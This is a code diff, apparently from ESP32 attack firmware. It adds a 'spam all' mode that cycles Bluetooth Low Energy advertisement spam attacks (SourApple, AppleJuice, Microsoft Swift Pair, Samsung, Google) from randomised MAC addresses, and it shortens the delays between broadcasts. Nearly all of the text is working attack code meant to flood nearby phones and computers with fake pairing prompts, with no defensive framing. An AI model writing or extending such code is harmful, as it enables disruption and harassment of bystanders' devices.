@@ -234,6 +234,13 @@ void BLEModules::StartMode(BLEScanState mode) {
         executeSwiftpair(Samsung);
     else if (mode == BLE_ATTACK_EXPLOIT_GOOGLE)
         executeSwiftpair(Google);
+    else if (mode == BLE_ATTACK_EXPLOIT_SPAM_ALL) {
+        executeSwiftpair(SourApple, true);
+        executeSwiftpair(AppleJuice, true);
+        executeSwiftpair(Microsoft, true);
+        executeSwiftpair(Samsung, true);
+        executeSwiftpair(Google, true);
+    }
     else if (mode == BLE_ATTACK_SPOOFER_INIT)
         initSpoofer();
     else if (mode == BLE_ATTACK_EXPLOIT_INIT)
@@ -358,7 +365,7 @@ void BLEModules::initSpam() {
     Serial.println("[INFO] BLE Spam Initialized Successfully!");
 }
 
-void BLEModules::executeSwiftpair(EBLEPayloadType type)
+void BLEModules::executeSwiftpair(EBLEPayloadType type, bool forspamall)
 {
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
@@ -372,7 +379,7 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type)
     BLEDevice::init("");
     BLEServer *pServer = BLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
-    vTaskDelay(40 / portTICK_PERIOD_MS);
+    vTaskDelay(10 / portTICK_PERIOD_MS);
     BLEAdvertisementData advertisementData = GetAdvertismentData(type);
     pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setAdvertisementData(advertisementData);
@@ -381,9 +388,13 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type)
     pAdvertising->setMinPreferred(0x20);
     pAdvertising->setMaxPreferred(0x20);
     pAdvertising->start();
-    if (type == AppleJuice) vTaskDelay(espatsettings.applejuiceSpamDelay / portTICK_PERIOD_MS);
-    else if (type == SourApple) vTaskDelay(espatsettings.sourappleSpamDelay / portTICK_PERIOD_MS);
-    else vTaskDelay(espatsettings.swiftpairSpamDelay / portTICK_PERIOD_MS);
+    if (!forspamall) {
+        if (type == AppleJuice) vTaskDelay(espatsettings.applejuiceSpamDelay / portTICK_PERIOD_MS);
+        else if (type == SourApple) vTaskDelay(espatsettings.sourappleSpamDelay / portTICK_PERIOD_MS);
+        else vTaskDelay(espatsettings.swiftpairSpamDelay / portTICK_PERIOD_MS);
+    } else {
+        vTaskDelay(espatsettings.spamAllDelay / portTICK_PERIOD_MS);
+    }
     pAdvertising->stop();
     vTaskDelay(10 / portTICK_PERIOD_MS);
     BLEDevice::deinit();
